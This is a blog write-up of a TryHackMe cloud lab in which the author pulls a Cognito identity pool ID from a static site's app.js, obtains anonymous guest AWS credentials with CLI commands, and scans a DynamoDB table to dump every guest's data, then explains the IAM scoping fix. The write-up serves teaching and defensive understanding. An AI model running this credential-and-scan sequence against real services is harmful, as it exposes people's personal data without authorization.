---
layout: post
title: "THM: Free App, Free Data"
date: 2026-07-30
category: "Cloud"
difficulty: "Easy"
tags: [thm, hacker-holidays, cloud, aws, cognito, iam, dynamodb]
excerpt: "A free wellness app with no login screen that somehow already knows your name. This is my first cloud room, and the answer wasn't a cracked password or a clever payload. It was one IAM role handed to anonymous guests that could read the entire database instead of just their own row."
---

<figure class="figure-narrow">
  <img src="{{ '/assets/img/free-app-briefing.png' | relative_url }}" alt="TryHackMe room page: Concierge Briefing for the Byte Lotus Wellness app. Category Cloud, difficulty Easy, 60 points. A free complimentary app with no login that already knows your name, contacts, and location. Itinerary: track down the AWS mechanism issuing credentials, dump more than your own record from the app's DynamoDB table, and retrieve the flag from another guest's data.">
  <figcaption>The briefing does what every room in this event does: it spells out the whole solve in flavour text. "It just... knows things about you the moment you open it," and the itinerary is basically get AWS credentials, read more than your own row, take someone else's flag.</figcaption>
</figure>

This is my first proper cloud room, so fair warning: I went in knowing almost
nothing about AWS beyond the buzzwords. It's part of TryHackMe's Hacker Holidays
event, filed under Cloud / AWS, marked Easy, worth 60 points. Like everything else
in this event it lives in the Byte Lotus universe, and this time the target is a
wellness app.

The setup is a free app called **Byte Lotus Wellness**. There's no login screen at
all, you just open it. And that's the hook: it already seems to know things about
you. The task basically asks two questions. How does an app with no accounts know
anything about you in the first place, and once you understand that, what else
will it hand over if you ask nicely?

Before anything else, the obvious disclaimer: this is a deliberately vulnerable
TryHackMe lab. The "guests" and their data are fake and the whole thing is built
to be broken for practice. Nothing here is a real service.

## How does a no-login app know who I am?

This was the part I actually had to go and learn, so let me explain it the way I
wish someone had explained it to me.

The app is a static site hosted on S3 (the address is one of those long
`...s3-website-us-east-1.amazonaws.com` URLs). A static site has no backend of its
own doing logins, so how does it read and write data? The answer is that the
browser talks to AWS directly, and the thing that lets an anonymous browser do
that is **AWS Cognito**.

Cognito has a feature called an Identity Pool, and an Identity Pool can hand out
**guest credentials** to visitors who have never logged in. This is a real,
intended feature. It's how an app lets an anonymous user do something (save a
preference, read some shared data) without forcing them to make an account first.
Every anonymous visitor gets handed a temporary set of AWS credentials tied to a
"guest" role.

So on its own, "anonymous users get credentials" is not the bug. It's working as
designed. The bug, as I'd find out, is what those guest credentials are allowed
to do once you have them.

## Reading the source

Since it's a static site, all the client-side logic ships to your browser. So the
first thing I did was open DevTools and read `app.js`, and the whole Cognito setup
was just sitting there in plain text:

```
IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"
AWS_REGION       = "us-east-1"
TABLE_NAME       = "complimentary-GuestWellnessProfiles"
```

That's the identity pool the app uses, the region it lives in, and the name of the
DynamoDB table it reads from. Not secrets in any meaningful sense, this is just how
the client is wired, but it's everything I needed to talk to AWS myself.

One thing that ate some of my time, so I'll flag it for anyone else: `localStorage`
had a value called `byteLotusGuestId` set to `admin`. My beginner brain immediately
went "aha, admin, that's the way in." It is not. It's a **red herring**. That value
is just a label the app keeps on the client side, and changing it does nothing,
because none of the actual access control happens in your browser. Ignore it.

## Walking the exploit

The plan, once the Cognito idea clicked, was: ask the pool for a guest identity,
trade that identity for real AWS credentials, become the guest, and then see what
the guest can read.

**1. Get a guest identity from the pool.** No auth needed, that's the whole point
of an unauthenticated identity pool.

```bash
aws cognito-identity get-id \
  --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688 \
  --region us-east-1 --output json
```

This returns an `IdentityId`. Think of it as "here is who you are as a guest",
not credentials yet.

**2. Trade the identity for real AWS credentials.**

```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id <IdentityId-from-step-2> \
  --region us-east-1 --output json
```

This one gives you back an `AccessKeyId`, a `SecretKey`, and a `SessionToken`.
Those are live, temporary AWS credentials for the guest role.

**3. Become the guest** by exporting those three values. All three matter. The
session token is the bit that makes temporary credentials actually work, and I
didn't know that at first.

```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretKey>
export AWS_SESSION_TOKEN=<SessionToken>
```

To check it worked, I asked AWS who I am now:

```bash
aws sts get-caller-identity
```

The ARN came back as:

```
arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials
```

That `complimentary-cognito-unauth-role` is the guest (unauthenticated) role, so
this confirmed I was now acting as the anonymous guest the app hands out to
everyone. So far, still nothing I wasn't meant to have.

**4. Read the table.** This is where it goes wrong. I ran a full scan of the
DynamoDB table from `app.js`:

```bash
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles \
  --region us-east-1 --output json
```

And it returned every profile in the table. All five guests, complete with names,
emails, phone numbers, passwords, and GPS coordinates. As an anonymous visitor
with no account, I could dump everybody's data.

The flag itself was tucked into the `notes` field of one of the records
(`guest-vip-042`). I'm not reproducing it here, it comes back looking like
`THM{[redacted]}`, go earn your own.

## The gotchas that got me

Because I'm new to this, I made a pile of small mistakes, and honestly these were
the most useful part of the room. If you're also starting out, you'll probably hit
some of these too:

- **`--identify-pool-id` instead of `--identity-pool-id`.** It's identity, not
  identify. I stared at that error for longer than I'd like to admit.
- **A broken AWS CLI setting.** My config had `output = temp` in it from some
  earlier mess-around. That produced two really confusing errors: first a
  malformed endpoint like `cognito-identity.temp.amazonaws.com`, then
  `Unknown output type: temp`. The fix is either to pass `--output json` on each
  command (which is why it's on every command above) or to set it permanently with
  `aws configure set output json`.
- **`AccessDeniedException` that wasn't actually about access.** At one point I
  accidentally passed the literal word `dynamodb` as the table name. It threw an
  access denied error, which really looked like I'd hit a permissions wall and got
  me thinking the attack was dead. It wasn't. It was just the wrong table name.
  The real name is the one from `app.js`.
- **Pool ID vs identity ID.** The identity pool ID (in `app.js`) and my own
  identity ID (the one I got back in step 1) look almost identical, same
  `us-east-1:` prefix and a long GUID. They are different things and I kept
  pasting the wrong one. The pool is the whole pool; the identity is just me.

## The actual lesson

Here's the thing I want to remember from this room: **nothing here was a cracked
password or a clever payload. It was an IAM misconfiguration.**

Walk back through it. Cognito handing guest credentials to anonymous visitors?
Intended. Getting temporary creds and assuming the guest role? Also intended,
that's the feature. The single thing that turned a normal anonymous-access setup
into a full data breach was the IAM policy attached to that guest role.

The `complimentary-cognito-unauth-role` was granted `dynamodb:Scan` on the
**entire** table. A scan reads everything. So the moment any anonymous person
became a guest, they could read every row, not just their own.

What it should have done is restrict each guest to reading only their own record.
DynamoDB and IAM can do exactly that. You tie the policy to the caller's Cognito
identity and use a `dynamodb:LeadingKeys` condition so the role can only touch
rows whose partition key matches that identity. Scoped like that, a guest asking
for the table gets back their own row and nothing else, and the same `scan` I ran
would have returned only me.

So the one-line version, the bit I'm writing on a sticky note: **the problem was
an over-permissive role, not weak authentication.** The front door being open to
guests was fine. The problem was that once you were a guest, you were handed the
keys to the whole building.

## What I took away

- "There's no login" does not mean "there's no access control to think about."
  With Cognito, the access control moves into the IAM role behind the guest
  identity, and that's exactly where I'd now go looking.
- Read the client. On a static site, `app.js` will happily tell you the identity
  pool, the region, and the table. That's not the vulnerability, but it's the map.
- An `AccessDenied` isn't always a wall, and a value called `admin` isn't always a
  door. I wasted time treating both as more meaningful than they were. Slow down
  and check the boring explanation first (wrong table name, client-side label).
- When you're granting permissions, "read the table" and "read your own row" are
  worlds apart. `dynamodb:Scan` on the whole table for an anonymous role is how
  five strangers' passwords and GPS coordinates end up in my terminal.

First cloud room done. It didn't feel like hacking in the movie sense, it felt
like reading the docs, spotting one setting that was too generous, and asking the
API politely. Which, from what I can tell, is a pretty accurate picture of what
cloud misconfigurations actually look like.

> Room: Free App, Free Data on TryHackMe (Hacker Holidays), Cloud / AWS, Easy.
> No real flag reproduced here on purpose. It's a great first cloud box if you've
> only ever done web and Linux stuff before, like me.
